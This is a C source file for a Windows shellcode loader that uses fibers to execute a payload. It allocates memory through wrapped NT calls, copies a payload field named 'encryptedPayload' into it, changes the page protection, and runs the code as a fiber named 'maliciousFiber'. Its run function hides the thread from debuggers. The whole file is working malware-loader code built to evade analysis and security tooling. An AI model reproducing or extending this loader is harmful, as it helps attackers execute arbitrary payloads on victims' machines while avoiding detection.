#include "lucky_fiber_loader.h"

VOID CALLBACK fiberFunc2(LPVOID lpParameter);
VOID CALLBACK fiberFunc1(LPVOID lpParameter);

VOID CALLBACK fiberFunc1(LPVOID lpParameter) {
  Loader *loader = (Loader *)lpParameter;
  SIZE_T allocSize = loader->allocSize;
  PVOID baseAddress = NULL;
  MyNtAllocateVirtualMemory(MyGetCurrentProcess(), &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  loader->shellcodeMemory = baseAddress;
  RtlZeroMemory(loader->shellcodeMemory, loader->allocSize);

  MySwitchToFiber(loader->fiber2);
  ProtectMemoryPages(loader->shellcodeMemory, loader->allocSize);

  MySwitchToFiber(loader->fiber2);
}

VOID CALLBACK fiberFunc2(LPVOID lpParameter) {
  Loader *loader = (Loader *)lpParameter;
  memcpy(loader->shellcodeMemory, loader->encryptedPayload, loader->payloadSize);

  MySwitchToFiber(loader->fiber1);
  loader->maliciousFiber = MyCreateFiber(0, (LPFIBER_START_ROUTINE)(loader->shellcodeMemory), NULL);

  MySwitchToFiber(loader->maliciousFiber);
}

Loader *newLoader(unsigned char *encryptedPayload, SIZE_T size) {
  Loader *l = (Loader *)malloc(sizeof(Loader));
  if (!l) {
    return NULL;
  }
  l->encryptedPayload = encryptedPayload;
  l->fiber1 = MyCreateFiber(0, fiberFunc1, l);
  l->fiber2 = MyCreateFiber(0, fiberFunc2, l);
  l->maliciousFiber = NULL;
  l->payloadSize = size;
  l->allocSize = ALIGN16(size);
  l->shellcodeMemory = NULL;
  return l;
}

void LuckyRun(Loader *l) {
  MyNtSetInformationThread(MyGetCurrentThread(), 0x11, NULL, 0);
  MyConvertThreadToFiber(NULL);

  MySwitchToFiber(l->fiber1);
}
